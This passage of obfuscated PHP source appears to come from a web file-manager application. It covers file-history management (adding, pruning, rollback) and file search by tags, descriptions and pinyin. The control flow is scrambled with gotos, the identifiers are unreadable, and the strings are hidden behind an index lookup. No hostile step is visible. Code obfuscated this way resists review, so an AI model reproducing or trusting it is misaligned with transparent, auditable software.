B–…çÙ°™¹: return $this->eventListParse($CÊß„…Á—ˆ, $C½Éö‘…ÑÓ); goto CÀ‡åÙ“Ê¹; CÀ‡åÙ“Ê¹: } private function eventListParse($eßõ¢¸ÎÜ¹, $CÅõ‰ŒÑ§») { goto A°ŞÙÈƒïï; EÆ÷óÖ¢´: $dµšÃî­õ = array_to_keyvalue($aì”Â•Ñß, $BíÉ…Ø¨éİ[43], $BíÉ…Ø¨éİ[2286]); foreach ($aì”Â•Ñß as $cÊœ•®™«) { $bêññ¤ÃõÜ = $cÊœ•®™«[$BíÉ…Ø¨éİ[413]]; if ($cÊœ•®™«[$BíÉ…Ø¨éİ[39]] == $BíÉ…Ø¨éİ[500] && isset($bêññ¤ÃõÜ[$BíÉ…Ø¨éİ[1004]])) { $e·Æ¤Ûàğ[] = $bêññ¤ÃõÜ[$BíÉ…Ø¨éİ[1004]] . $BíÉ…Ø¨éİ[43]; $e·Æ¤Ûàğ[] = $bêññ¤ÃõÜ[$BíÉ…Ø¨éİ[1005]] . $BíÉ…Ø¨éİ[43]; } if ($cÊœ•®™«[$BíÉ…Ø¨éİ[39]] == $BíÉ…Ø¨éİ[2294] && isset($bêññ¤ÃõÜ[$BíÉ…Ø¨éİ[377]])) { $e·Æ¤Ûàğ[] = $bêññ¤ÃõÜ[$BíÉ…Ø¨éİ[377]] . $BíÉ…Ø¨éİ[43]; } } $e·Æ¤Ûàğ = array_merge($e·Æ¤Ûàğ, $dµšÃî­õ, array($CÅõ‰ŒÑ§» . $BíÉ…Ø¨éİ[43])); goto aÕ—øµ‘ë; b µ‹Âä¹Ù: $bœè¢ÏÄæß = Model($BíÉ…Ø¨éİ[752])->sourceListInfo($e·Æ¤Ûàğ, !0); foreach ($aì”Â•Ñß as &$cÊœ•®™«) { if ($cÊœ•®™«[$BíÉ…Ø¨éİ[39]] == $BíÉ…Ø¨éİ[500] && isset($cÊœ•®™«[$BíÉ…Ø¨éİ[413]][$BíÉ…Ø¨éİ[1004]])) { $cÊœ•®™«[$BíÉ…Ø¨éİ[413]][$BíÉ…Ø¨éİ[1004]] = $bœè¢ÏÄæß[$cÊœ•®™«[$BíÉ…Ø¨éİ[413]][$BíÉ…Ø¨éİ[1004]]]; $cÊœ•®™«[$BíÉ…Ø¨éİ[413]][$BíÉ…Ø¨éİ[1005]] = $bœè¢ÏÄæß[$cÊœ•®™«[$BíÉ…Ø¨éİ[413]][$BíÉ…Ø¨éİ[1005]]]; } if ($cÊœ•®™«[$BíÉ…Ø¨éİ[39]] == $BíÉ…Ø¨éİ[2294] && isset($cÊœ•®™«[$BíÉ…Ø¨éİ[413]][$BíÉ…Ø¨éİ[377]])) { $cÊœ•®™«[$BíÉ…Ø¨éİ[413]][$BíÉ…Ø¨éİ[377]] = $bœè¢ÏÄæß[$cÊœ•®™«[$BíÉ…Ø¨éİ[413]][$BíÉ…Ø¨éİ[377]]]; } $cÊœ•®™«[$BíÉ…Ø¨éİ[399]] = $bœè¢ÏÄæß[$cÊœ•®™«[$BíÉ…Ø¨éİ[377]]]; $cÊœ•®™«[$BíÉ…Ø¨éİ[2299]] = $bœè¢ÏÄæß[$cÊœ•®™«[$BíÉ…Ø¨éİ[2286]]]; if ($cÊœ•®™«[$BíÉ…Ø¨éİ[39]] == $BíÉ…Ø¨éİ[2068]) { $cÊœ•®™«[$BíÉ…Ø¨éİ[2299]] = $cÊœ•®™«[$BíÉ…Ø¨éİ[399]]; $cÊœ•®™«[$BíÉ…Ø¨éİ[2286]] = $cÊœ•®™«[$BíÉ…Ø¨éİ[2299]][$BíÉ…Ø¨éİ[377]]; $cÊœ•®™«[$BíÉ…Ø¨éİ[399]] = !1; $cÊœ•®™«[$BíÉ…Ø¨éİ[377]] = $BíÉ…Ø¨éİ[43]; } $cÊœ•®™«[$BíÉ…Ø¨éİ[2242]] = $DíŠæ‚æÑ¯[$cÊœ•®™«[$BíÉ…Ø¨éİ[1434]]]; } $eßõ¢¸ÎÜ¹[$BíÉ…Ø¨éİ[363]] = $aì”Â•Ñß; goto A‰ëä»¸Ë; A‰ëä»¸Ë: return $eßõ¢¸ÎÜ¹; goto AÃÓ¦°°Œ›; aÕ—øµ‘ë: $e·Æ¤Ûàğ = array_unique($e·Æ¤Ûàğ); $Fº—ê®Š¸ƒ = array_unique(array_to_keyvalue($aì”Â•Ñß, $BíÉ…Ø¨éİ[43], $BíÉ…Ø¨éİ[1434])); $DíŠæ‚æÑ¯ = Model($BíÉ…Ø¨éİ[485])->userListInfo($Fº—ê®Š¸ƒ); goto b µ‹Âä¹Ù; A°ŞÙÈƒïï: $BíÉ…Ø¨éİ =& $_SERVER[©]; $aì”Â•Ñß = $eßõ¢¸ÎÜ¹[$BíÉ…Ø¨éİ[363]]; $e·Æ¤Ûàğ = array_to_keyvalue($aì”Â•Ñß, $BíÉ…Ø¨éİ[43], $BíÉ…Ø¨éİ[377]); goto EÆ÷óÖ¢´; AÃÓ¦°°Œ›: } public function removeBySource($FÃÎù¦¬ïõ) { $fÔğ„ë‚¯˜ = array($_SERVER[©][391] => $FÃÎù¦¬ïõ); $this->where($fÔğ„ë‚¯˜)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\x63\x65\137\150\x69\163\164\157\162\x79"; public function addHistory($aÄåÍÑÜìã, $a¾‹‚“±‘£ = '') { $d®î¾“¼âƒ =& $_SERVER[©]; $D¤˜Ÿ§Û’é = array($d®î¾“¼âƒ[391] => $aÄåÍÑÜìã[$d®î¾“¼âƒ[377]], $d®î¾“¼âƒ[1425] => isset($aÄåÍÑÜìã[$d®î¾“¼âƒ[387]]) ? $aÄåÍÑÜìã[$d®î¾“¼âƒ[387]] : $aÄåÍÑÜìã[$d®î¾“¼âƒ[386]], $d®î¾“¼âƒ[428] => $aÄåÍÑÜìã[$d®î¾“¼âƒ[427]], $d®î¾“¼âƒ[528] => $aÄåÍÑÜìã[$d®î¾“¼âƒ[87]], $d®î¾“¼âƒ[2300] => $a¾‹‚“±‘£); $eÈ’Ë¸Ì‡ù = $GLOBALS[$d®î¾“¼âƒ[16]][$d®î¾“¼âƒ[94]][$d®î¾“¼âƒ[2301]]; if ($eÈ’Ë¸Ì‡ù > 1) { $this->historyAutoClear($D¤˜Ÿ§Û’é[$d®î¾“¼âƒ[377]]); $this->add($D¤˜Ÿ§Û’é); } Model($d®î¾“¼âƒ[2302])->eventFileEdit($aÄåÍÑÜìã[$d®î¾“¼âƒ[377]]); } private function historyAutoClear($E²ŠÊ‰„¦´) { goto Cø‚“Ë„Õ—; eİ¬‘Î˜Ë“: $dÓæŒÔœê = array($dÓÃ··¾ÔÖ[393] => array($dÓÃ··¾ÔÖ[17], $c¶Œ¸ˆõ—Ü)); $this->where($dÓæŒÔœê)->delete(); Model($dÓÃ··¾ÔÖ[430])->remove($f¼È´ù«Õ“); goto cŠ«èİ—õ; Cø‚“Ë„Õ—: $dÓÃ··¾ÔÖ =& $_SERVER[©]; $f¯¸¤˜‰°¾ = Model($dÓÃ··¾ÔÖ[1085])->get($dÓÃ··¾ÔÖ[2303]); $A¨Ãë°áÑ± = $GLOBALS[$dÓÃ··¾ÔÖ[16]][$dÓÃ··¾ÔÖ[94]][$dÓÃ··¾ÔÖ[2301]]; goto D…«¤ºß‘Ü; FíÛ‘ÏÜÚÃ: if (!$eİçÕ£”ĞÅ || $A½¬•µçã >= count($eİçÕ£”ĞÅ)) { return; } $c¶Œ¸ˆõ—Ü = array_to_keyvalue($eİçÕ£”ĞÅ, $dÓÃ··¾ÔÖ[43], $dÓÃ··¾ÔÖ[375]); $c¶Œ¸ˆõ—Ü = array_slice($c¶Œ¸ˆõ—Ü, $A½¬•µçã); goto AèË¾÷½é§; dëÔŞÍÑ«²: if ($A½¬•µçã >= 500) { return; } $dÓæŒÔœê = array($dÓÃ··¾ÔÖ[391] => $E²ŠÊ‰„¦´); $eİçÕ£”ĞÅ = $this->field($dÓÃ··¾ÔÖ[2305])->where($dÓæŒÔœê)->order($dÓÃ··¾ÔÖ[2297])->select(); goto FíÛ‘ÏÜÚÃ; AèË¾÷½é§: $f¼È´ù«Õ“ = array_to_keyvalue($eİçÕ£”ĞÅ, $dÓÃ··¾ÔÖ[43], $dÓÃ··¾ÔÖ[427]); $f¼È´ù«Õ“ = array_slice($f¼È´ù«Õ“, $A½¬•µçã); if (!$c¶Œ¸ˆõ—Ü || !$f¼È´ù«Õ“) { return; } goto eİ¬‘Î˜Ë“; D…«¤ºß‘Ü: $FİöÈ‡¡¡à = $f¯¸¤˜‰°¾ == $dÓÃ··¾ÔÖ[2304] ? 3 : $A¨Ãë°áÑ±; if ($A¨Ãë°áÑ± <= 1) { $FİöÈ‡¡¡à = 1; } $A½¬•µçã = $FİöÈ‡¡¡à - 1; goto dëÔŞÍÑ«²; cŠ«èİ—õ: } public function listData($A“†ˆ‰ÔÃ) { goto cƒ§ˆ²º¾; eÈé’„ªã‰: $F²´ÇÅŠç­ = 3; if ($cÁ¥¨¬ï²Ô == $b—¢©ÅŸ•¨[2304]) { $b©ñ‰ŒáÊâ[$b—¢©ÅŸ•¨[363]] = array_slice($b©ñ‰ŒáÊâ[$b—¢©ÅŸ•¨[363]], 0, $F²´ÇÅŠç­); $b©ñ‰ŒáÊâ[$b—¢©ÅŸ•¨[360]] = array($b—¢©ÅŸ•¨[2307] => 1, $b—¢©ÅŸ•¨[2308] => 20, $b—¢©ÅŸ•¨[2309] => 1, $b—¢©ÅŸ•¨[2310] => count($b©ñ‰ŒáÊâ[$b—¢©ÅŸ•¨[363]])); } return $b©ñ‰ŒáÊâ; goto cò¢çîà©ø; cƒ§ˆ²º¾: $b—¢©ÅŸ•¨ =& $_SERVER[©]; $bÇ‘Ñø¥¢É = array($b—¢©ÅŸ•¨[391] => $A“†ˆ‰ÔÃ); $a¼íÚº£ÄÌ = $b—¢©ÅŸ•¨[2306]; goto Eä†¨òğËº; Eä†¨òğËº: $b©ñ‰ŒáÊâ = $this->field($a¼íÚº£ÄÌ)->where($bÇ‘Ñø¥¢É)->order($b—¢©ÅŸ•¨[2297])->selectPage(); $this->_listAppendUser($b©ñ‰ŒáÊâ[$b—¢©ÅŸ•¨[363]]); $cÁ¥¨¬ï²Ô = Model($b—¢©ÅŸ•¨[1085])->get($b—¢©ÅŸ•¨[2303]); goto eÈé’„ªã‰; cò¢çîà©ø: } protected function _listAppendUser(&$EØÊŸ¯îÀ) { $Bµ³Ø„èÚõ =& $_SERVER[©]; $CñÓ¯âÈ¦‹ = array_to_keyvalue($EØÊŸ¯îÀ, $Bµ³Ø„èÚõ[43], $Bµ³Ø„èÚõ[1434]); $fà§ß¶” = Model($Bµ³Ø„èÚõ[485])->userListInfo($CñÓ¯âÈ¦‹); foreach ($EØÊŸ¯îÀ as &$AŸË¸‚²¾†) { $B“‰ÓÎ‰øÄ = $AŸË¸‚²¾†[$Bµ³Ø„èÚõ[1434]]; $AŸË¸‚²¾†[$Bµ³Ø„èÚõ[386]] = $fà§ß¶”[$B“‰ÓÎ‰øÄ] ? $fà§ß¶”[$B“‰ÓÎ‰øÄ] : !1; } } public function fileInfo($DÆ‰¢¬äõê) { $CÇªâ„† =& $_SERVER[©]; $Eñ…‡Æ…½Ÿ = $this->tablePrefix; $FÃ–×ØÖ÷ = "{$Eñ…‡Æ…½Ÿ}\151\x6f\137\146\x69\154\x65\40\146\151\154\x65\x73\x20\x6f\x6e\x20\x66\151\x6c\x65\163\x2e\146\151\x6c\145\x49\x44\40\75\x20\150\x69\163\164\x6f\x72\171\56\x66\151\x6c\x65\111\x44"; return $this->alias($CÇªâ„†[2311])->where(array($CÇªâ„†[393] => $DÆ‰¢¬äõê))->join($FÃ–×ØÖ÷, $CÇªâ„†[2312])->find(); } public function removeItem($f±¨œÔÇÅŠ) { $E‰¬·‚·é× =& $_SERVER[©]; $F¥’…Ëâ–§ = array($E‰¬·‚·é×[393] => $f±¨œÔÇÅŠ); $E¸éœåºÙ = $this->where($F¥’…Ëâ–§)->find(); if ($E¸éœåºÙ) { $eÎäãâò ¯ = $this->where($F¥’…Ëâ–§)->delete(); Model($E‰¬·‚·é×[430])->remove($E¸éœåºÙ[$E‰¬·‚·é×[427]]); return $eÎäãâò ¯; } return !1; } public function removeBySource($cŸ²—ğÖæö) { goto b›¶†µ³á¢; b›¶†µ³á¢: $eî†ÌªÕ =& $_SERVER[©]; if (!$cŸ²—ğÖæö) { return !1; } if (!is_array($cŸ²—ğÖæö)) { $cŸ²—ğÖæö = array($cŸ²—ğÖæö); } goto E¥¿æÏæº; DàÏˆí‹ÈÎ: return !0; goto fªéŸìãÄ™; E¥¿æÏæº: $f¥²ËÙŞ† = array($eî†ÌªÕ[391] => array($eî†ÌªÕ[17], $cŸ²—ğÖæö)); $FŠÎÅ³°ç = $this->field($eî†ÌªÕ[428])->where($f¥²ËÙŞ†)->select(); if ($FŠÎÅ³°ç) { $this->where($f¥²ËÙŞ†)->delete(); $F§ÑÂ³ÌÖ = array_to_keyvalue($FŠÎÅ³°ç, $eî†ÌªÕ[43], $eî†ÌªÕ[427]); Model($eî†ÌªÕ[430])->remove($F§ÑÂ³ÌÖ); } goto DàÏˆí‹ÈÎ; fªéŸìãÄ™: } public function setDetail($D„‡èÎæº±, $eãíòÜì«¸) { $bÊ½ø×ŞÂß =& $_SERVER[©]; return $this->where(array($bÊ½ø×ŞÂß[393] => $D„‡èÎæº±))->save(array($bÊ½ø×ŞÂß[2300] => $eãíòÜì«¸)); } public function rollbackToItem($F¤„ßŒ¢—, $BÊ§’©Í¡Ë) { goto bã·µµ×ùˆ; c‹Ò‡ùÍ–£: $C«À«¡Úğ‚ = $this->find($BÊ§’©Í¡Ë); $Bé×ÔÈ›ãÎ = array($BÏÙœ¬ñ[427] => $C«À«¡Úğ‚[$BÏÙœ¬ñ[427]], $BÏÙœ¬ñ[87] => $C«À«¡Úğ‚[$BÏÙœ¬ñ[87]], $BÏÙœ¬ñ[117] => time(), $BÏÙœ¬ñ[387] => USER_ID); Model($BÏÙœ¬ñ[752])->where(array($BÏÙœ¬ñ[377] => $F¤„ßŒ¢—))->save($Bé×ÔÈ›ãÎ); goto AÌØ¦Š¤‰æ; AÌØ¦Š¤‰æ: return $this->where(array($BÏÙœ¬ñ[393] => $BÊ§’©Í¡Ë))->delete(); goto Aëô®ŠÊêÁ; bã·µµ×ùˆ: $BÏÙœ¬ñ =& $_SERVER[©]; $F¡õç¢¸ÇÜ = Model($BÏÙœ¬ñ[752])->sourceInfo($F¤„ßŒ¢—); $this->addHistory($F¡õç¢¸ÇÜ); goto c‹Ò‡ùÍ–£; Aëô®ŠÊêÁ: } public function clearSame($e¥¡‘ë«¾™) { goto AÒšÜ¡ñÏ†; AÒšÜ¡ñÏ†: $d°‚Ú³½¹İ =& $_SERVER[©]; $FÑ¹é¤ÉÁ = $this->listData($e¥¡‘ë«¾™); $aÆĞ¸ƒ±ã¼ = array_to_keyvalue_group($FÑ¹é¤ÉÁ, $d°‚Ú³½¹İ[427]); goto eã’¸á““; E½ãä¢çùĞ: if (!$eöØ¹¶´ù) { return; } $this->where(array($d°‚Ú³½¹İ[375] => array($d°‚Ú³½¹İ[17], $eöØ¹¶´ù)))->delete(); Model($d°‚Ú³½¹İ[430])->remove($a¹ÚùŒ¿÷); goto f£—ÏùæÒÅ; eã’¸á““: $a¹ÚùŒ¿÷ = array(); $eöØ¹¶´ù = array(); foreach ($aÆĞ¸ƒ±ã¼ as $bÃ§ï¹ÑöÌ) { if (!$bÃ§ï¹ÑöÌ || count($bÃ§ï¹ÑöÌ) <= 1) { continue; } foreach ($bÃ§ï¹ÑöÌ as $c¢Š­ƒÂ) { $a¹ÚùŒ¿÷[] = $c¢Š­ƒÂ[$d°‚Ú³½¹İ[427]]; $eöØ¹¶´ù[] = $c¢Š­ƒÂ[$d°‚Ú³½¹İ[375]]; } } goto E½ãä¢çùĞ; f£—ÏùæÒÅ: } public function userSpace() { $cä‡ÈĞ£ŒÃ =& $_SERVER[©]; $EŒ¢Ë¤æ¹À = $this->tablePrefix; $A÷â›ºˆÉç = array($cä‡ÈĞ£ŒÃ[1425] => USER_ID); $E÷‚Áé‡°Í = "{$EŒ¢Ë¤æ¹À}\x69\x6f\x5f\146\151\x6c\145\x20\x66\151\x6c\x65\x73\40\x6f\x6e\x20\x66\x69\154\x65\163\56\x66\151\x6c\145\111\104\40\x3d\40\x68\x69\x73\164\x6f\x72\171\x2e\x66\151\154\x65\111\104"; return $this->alias($cä‡ÈĞ£ŒÃ[2311])->where($A÷â›ºˆÉç)->join($E÷‚Áé‡°Í, $cä‡ÈĞ£ŒÃ[2312])->sum($cä‡ÈĞ£ŒÃ[87]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($B¿â›¯ŒËİ) { goto d®Ü¼«Ğ; FƒÈŸ¡£ˆ‚: if (!$f†ÙÊ–·£) { return array(); } $D¿ï¯ùç„Ê = $f†ÙÊ–·£[$FÄ³®À•§†[170]]; $c×Óæ­µ­Ø = $FÄ³®À•§†[17]; goto E¤ƒ‡æò¹È; E¤ƒ‡æò¹È: if (!$f†ÙÊ–·£[$FÄ³®À•§†[170]]) { $d´ÖÙ´õ÷÷ = array_to_keyvalue($bÃ¸ƒñÕ“ê, $FÄ³®À•§†[43], $FÄ³®À•§†[170]); $D¿ï¯ùç„Ê = implode($FÄ³®À•§†[57], $d´ÖÙ´õ÷÷); $c×Óæ­µ­Ø = $FÄ³®À•§†[2263]; } $f›©ç„Àåô = explode($FÄ³®À•§†[57], trim($D¿ï¯ùç„Ê, $FÄ³®À•§†[57])); return array($c×Óæ­µ­Ø, $f›©ç„Àåô); goto fÄİÊˆˆéÀ; d®Ü¼«Ğ: $FÄ³®À•§† =& $_SERVER[©]; $bÃ¸ƒñÕ“ê = KodIO::fileTypeList(); $f†ÙÊ–·£ = $bÃ¸ƒñÕ“ê[$B¿â›¯ŒËİ]; goto FƒÈŸ¡£ˆ‚; fÄİÊˆˆéÀ: } public function listPathType($Aå…ø³¨©) { $eĞÓÃ³“öË =& $_SERVER[©]; $AŸŞÑ‰ÏÏ‹ = $this->fileTypeWhere($Aå…ø³¨©); if (!$AŸŞÑ‰ÏÏ‹) { return array(); } $f„º ïÊñ = array($eĞÓÃ³“öË[529] => SourceModel::TYPE_USER, $eĞÓÃ³“öË[530] => USER_ID, $eĞÓÃ³“öË[526] => 0, $eĞÓÃ³“öË[527] => $AŸŞÑ‰ÏÏ‹); return $this->listSource($f„º ïÊñ); } public function listSearch($f¥Ø¡ì½Ô, $DÛ¹Ëè = 300) { goto fˆÖŒˆâÔ½; BÃ†ßİíæ–: if (!isset($B‹¶Ã¿œâ­[$FĞ‡•ÍŠÉ’[405]])) { $B‹¶Ã¿œâ­[$FĞ‡•ÍŠÉ’[405]] = 0; } $e¸Ğœ‘»ªË = $FĞ‡•ÍŠÉ’[2314]; $c‡õì†‹ëø = $e¸Ğœ‘»ªË; goto FÀÁÀ¸‡’ö; fˆÖŒˆâÔ½: $FĞ‡•ÍŠÉ’ =& $_SERVER[©]; if (isset($f¥Ø¡ì½Ô[$FĞ‡•ÍŠÉ’[2180]]) && $f¥Ø¡ì½Ô[$FĞ‡•ÍŠÉ’[2180]]) { $f¥Ø¡ì½Ô[$FĞ‡•ÍŠÉ’[2180]] = str_replace($FĞ‡•ÍŠÉ’[1590], $FĞ‡•ÍŠÉ’[2313], trim($f¥Ø¡ì½Ô[$FĞ‡•ÍŠÉ’[2180]])); } $B‹¶Ã¿œâ­ = $this->_parseSearchWhere($f¥Ø¡ì½Ô); goto BÃ†ßİíæ–; FÀÁÀ¸‡’ö: $this->_listSearchBindPinyin($f¥Ø¡ì½Ô, $B‹¶Ã¿œâ­, $e¸Ğœ‘»ªË); $this->alias($FĞ‡•ÍŠÉ’[495])->_makeOrder()->cache(null, 10); $dõ×ËÎÒƒÄ = $this->distinct(!0)->field($e¸Ğœ‘»ªË)->where($B‹¶Ã¿œâ­)->selectPage($DÛ¹Ëè); goto DÅˆ“†Ó¿²; E¾½ÌÙó§: $this->_listMake($dõ×ËÎÒƒÄ); return $dõ×ËÎÒƒÄ; goto cĞ××ø‹š÷; DÅˆ“†Ó¿²: $this->_listSearchDesc($dõ×ËÎÒƒÄ, $f¥Ø¡ì½Ô, $c‡õì†‹ëø); $this->_listSearchTag($dõ×ËÎÒƒÄ, $f¥Ø¡ì½Ô, $c‡õì†‹ëø); $this->_listDataApply($dõ×ËÎÒƒÄ[$FĞ‡•ÍŠÉ’[363]]); goto E¾½ÌÙó§; cĞ××ø‹š÷: } private function _listSearchTag(&$b•ÇŒÕ•‚æ, $B¼¤ì›ˆ¦, $d›“¿ÜŞÜ) { goto Eâ©ºßª…ì; a„«‘Ş—®÷: $e×¹ë´æ¢ = array_to_keyvalue($e×¹ë´æ¢, $b´÷‘×½ ù[43], $b´÷‘×½ ù[85]); $eõ¬ïŞÒˆ = array_unique($e×¹ë´æ¢); $this->_listSearchMerge($b•ÇŒÕ•‚æ, $B¼¤ì›ˆ¦, $d›“¿ÜŞÜ, $eõ¬ïŞÒˆ); goto b‰ÚÜµ¶Îœ; Eâ©ºßª…ì: $b´÷‘×½ ù =& $_SERVER[©]; if (!$B¼¤ì›ˆ¦[$b´÷‘×½ ù[2180]] || $b•ÇŒÕ•‚æ[$b´÷‘×½ ù[360]][$b´÷‘×½ ù[349]] > 1) { return; } $D¥ñÊˆ‡Ó = Model($b´÷‘×½ ù[2315])->listData(); goto D«ß¸®Ÿ÷í; eì¸¡ÁŒ²Ï: if (!$dÖÏ¬é‘¥¡) { return; } $c³¡Á›¯­¶ = array($b´÷‘×½ ù[401] => array($b´÷‘×½ ù[17], $dÖÏ¬é‘¥¡)); $e×¹ë´æ¢ = Model($b´÷‘×½ ù[402])->field($b´÷‘×½ ù[85])->where($c³¡Á›¯­¶)->select(); goto a„«‘Ş—®÷; D«ß¸®Ÿ÷í: $dÖÏ¬é‘¥¡ = array(); $d¥˜ïíëİÚ = $B¼¤ì›ˆ¦[$b´÷‘×½ ù[2180]]; foreach ($D¥ñÊˆ‡Ó as $dâÒ¬Üë‡‡) { $d•Šº˜÷„š = $dâÒ¬Üë‡‡[$b´÷‘×½ ù[38]]; $f÷••ÚÅ = str_replace($b´÷‘×½ ù[60], $b´÷‘×½ ù[43], Pinyin::encode($d•Šº˜÷„š)); if (stripos($d•Šº˜÷„š, $d¥˜ïíëİÚ) !== !1 || stripos($f÷••ÚÅ, $d¥˜ïíëİÚ) !== !1) { $dÖÏ¬é‘¥¡[] = $dâÒ¬Üë‡‡[$b´÷‘×½ ù[375]]; } } goto eì¸¡ÁŒ²Ï; b‰ÚÜµ¶Îœ: } private function _listSearchDesc(&$d¡¦Ô§Îëã, $bäµñ˜Ş÷, $díØ©ÙÃÉ‚) { goto A¥“ÔÙƒ™; BáŞ‰÷ìù: $d¡‰ˆÁ©‡µ = Model($e¾Æ·„ˆ˜ğ[512])->field($e¾Æ·„ˆ˜ğ[377])->where($CÕÌ’¤Û´‡)->select(); $B©„ë†ôÆˆ = array_to_keyvalue($d¡‰ˆÁ©‡µ, $e¾Æ·„ˆ˜ğ[43], $e¾Æ·„ˆ˜ğ[377]); $this->_listSearchMerge($d¡¦Ô§Îëã, $bäµñ˜Ş÷, $díØ©ÙÃÉ‚, $B©„ë†ôÆˆ); goto aƒ¸«ø±£; A¥“ÔÙƒ™: $e¾Æ·„ˆ˜ğ =& $_SERVER[©]; if (!$bäµñ˜Ş÷[$e¾Æ·„ˆ˜ğ[2180]] || $d¡¦Ô§Îëã[$e¾Æ·„ˆ˜ğ[360]][$e¾Æ·„ˆ˜ğ[349]] > 1) { return; } $dœÍ¼¹çÖ¢ = $this->listSearchChildren($bäµñ˜Ş÷[$e¾Æ·„ˆ˜ğ[469]]); goto c×Ö­†¨÷Ù; c×Ö­†¨÷Ù: $dœÍ¼¹çÖ¢ = array_unique($dœÍ¼¹çÖ¢); if (!$dœÍ¼¹çÖ¢) { return; } $CÕÌ’¤Û´‡ = array($e¾Æ·„ˆ˜ğ[377] => array($e¾Æ·„ˆ˜ğ[17], $dœÍ¼¹çÖ¢), $e¾Æ·„ˆ˜ğ[99] => $e¾Æ·„ˆ˜ğ[413], $e¾Æ·„ˆ˜ğ[368] => array($e¾Æ·„ˆ˜ğ[751], $e¾Æ·„ˆ˜ğ[2182] . $bäµñ˜Ş÷[$e¾Æ·„ˆ˜ğ[2180]] . $e¾Æ·„ˆ˜ğ[2182])); goto BáŞ‰÷ìù; aƒ¸«ø±£: } private function _listSearchMerge(&$aÅÊ·«ËÏ², $B˜ÚœÌ™Œ, $B¸˜ĞåĞé, $b·ñ¤ï˜ÊÎ) { goto dÕÊÛÙğ¤ ; f•ù²‚íó‹: $CÈ±à¦â† = $this->field($B¸˜ĞåĞé)->where($c÷ÑŒ„Ï”¥)->select(); if (!$CÈ±à¦â†) { return; } $fÌé¡ÎÊÂ = array(); goto fÇ’šÄóÑ’; dÕÊÛÙğ¤ : $eŠ­ØÉ­ =& $_SERVER[©]; if (!$b·ñ¤ï˜ÊÎ) { return; } $DŞ¤Á¦”´æ = array_to_keyvalue($aÅÊ·«ËÏ²[$eŠ­ØÉ­[363]], $eŠ­ØÉ­[43], $eŠ­ØÉ­[377]); goto AâÃóóæê; fÇ’šÄóÑ’: foreach ($CÈ±à¦â† as $b–ëèÂ™’) { $Aíğ°µ§¨ = $eŠ­ØÉ­[57] . $B˜ÚœÌ™Œ[$eŠ­ØÉ­[469]] . $eŠ­ØÉ­[57]; if (stripos($b–ëèÂ™’[$eŠ­ØÉ­[467]], $Aíğ°µ§¨) !== !1) { $fÌé¡ÎÊÂ[] = $b–ëèÂ™’; } } $aÅÊ·«ËÏ²[$eŠ­ØÉ­[363]] = array_merge($fÌé¡ÎÊÂ, $aÅÊ·«ËÏ²[$eŠ­ØÉ­[363]]); $aÅÊ·«ËÏ²[$eŠ­ØÉ­[360]][$eŠ­ØÉ­[361]] += count($fÌé¡ÎÊÂ); goto fÌÏï³ÅÇ»; AâÃóóæê: $B™°®ÆÒ‚ = array_diff($b·ñ¤ï˜ÊÎ, $DŞ¤Á¦”´æ); if (!$B™°®ÆÒ‚) { return; } $c÷ÑŒ„Ï”¥ = array($eŠ­ØÉ­[377] => array($eŠ­ØÉ­[17], $B™°®ÆÒ‚)); goto f•ù²‚íó‹; fÌÏï³ÅÇ»: } public function listSearchChildren($C‹¾æÃ¤, $A¦©‘Ÿ·‹š = 5000) { goto bæ­Àâ”; bæ­Àâ”: $cãšÚç˜Î =& $_SERVER[©]; $cø‰Öùâ¾µ = array(); $Fâºõ˜¼ó’ = $this->sourceInfo($C‹¾æÃ¤); goto eÏßšªÍî; FŠÓÑãÌèò: $DóÙ¶ãË²Á = $this->field($cãšÚç˜Î[377])->where($Eæº¥ÙË)->select(); $cø‰Öùâ¾µ = array_to_keyvalue($DóÙ¶ãË²Á, $cãšÚç˜Î[43], $cãšÚç˜Î[377]); return $cø‰Öùâ¾µ; goto a…î†ÉÂôÄ; eÏßšªÍî: $Eæº¥ÙË = array($cãšÚç˜Î[467] => array($cãšÚç˜Î[751], $Fâºõ˜¼ó’[$cãšÚç˜Î[467]] . $Fâºõ˜¼ó’[$cãšÚç˜Î[377]] . $cãšÚç˜Î[492])); $C’¦§·ÅÊº = $this->field($cãšÚç˜Î[377])->cache(null, 600)->where($Eæº¥ÙË)->count(); if ($C’¦§·ÅÊº > $A¦©‘Ÿ·‹š) { return $this->_listSearchChildrenNear($C‹¾æÃ¤, $A¦©‘Ÿ·‹š); } goto FŠÓÑãÌèò; a…î†ÉÂôÄ: } private function _listSearchChildrenNear($EÖ»ßåèõ, $DÈõë®øñ) { goto Cº²¼¸Ú‰¼; b¬™İ»â´º: $F«ø¼±°£À = $this->field($Eˆâ²“¶ïç[2316])->where($Aê¡²­ğ¹ê)->select(); $dÆÌˆ‘¹® = array_to_keyvalue(array_filter_by_field($F«ø¼±°£À, $Eˆâ²“¶ïç[378], $Eˆâ²“¶ïç[93]), $Eˆâ²“¶ïç[43], $Eˆâ²“¶ïç[377]); $f…ï„Ñª»¬ = array_merge($f…ï„Ñª»¬, array_to_keyvalue($F«ø¼±°£À, $Eˆâ²“¶ïç[43], $Eˆâ²“¶ïç[377])); goto Aø’š‘¿´; bÙåëØ’õ: $f…ï„Ñª»¬ = array_merge($f…ï„Ñª»¬, array_to_keyvalue($F«ø¼±°£À, $Eˆâ²“¶ïç[43], $Eˆâ²“¶ïç[377])); $f…ï„Ñª»¬ = array_slice($f…ï„Ñª»¬, 0, $DÈõë®øñ); return $f…ï„Ñª»¬; goto f±·ëŞßÇ; Cº²¼¸Ú‰¼: $Eˆâ²“¶ïç =& $_SERVER[©]; $f…ï„Ñª»¬ = array(); $Aê¡²­ğ¹ê = array($Eˆâ²“¶ïç[469] => $EÖ»ßåèõ); goto b¬™İ»â´º; Aø’š‘¿´: if (!$dÆÌˆ‘¹®) { return $f…ï„Ñª»¬; } $Aê¡²­ğ¹ê = array($Eˆâ²“¶ïç[469] => array($Eˆâ²“¶ïç[17], $dÆÌˆ‘¹®)); $F«ø¼±°£À = $this->field($Eˆâ²“¶ïç[2316])->where($Aê¡²­ğ¹ê)->select(); goto bÙåëØ’õ; f±·ëŞßÇ: } private function _listSearchBindPinyin($bğƒÀÎõ¸, &$AÜÙ‹ĞÎƒ, &$Eë…ªˆÇÇ¶) { goto eğŠïÍ·§‡; BËğ¿†Á‡Â: $e”ºÑ•·Ñ¼[] = array($eÛö×È¨Ô[2320] => $f¥ÒêÔ¦Ü‘, $eÛö×È¨Ô[911] => $eÛö×È¨Ô[2184], array($eÛö×È¨Ô[2321] => $f¥ÒêÔ¦Ü‘, 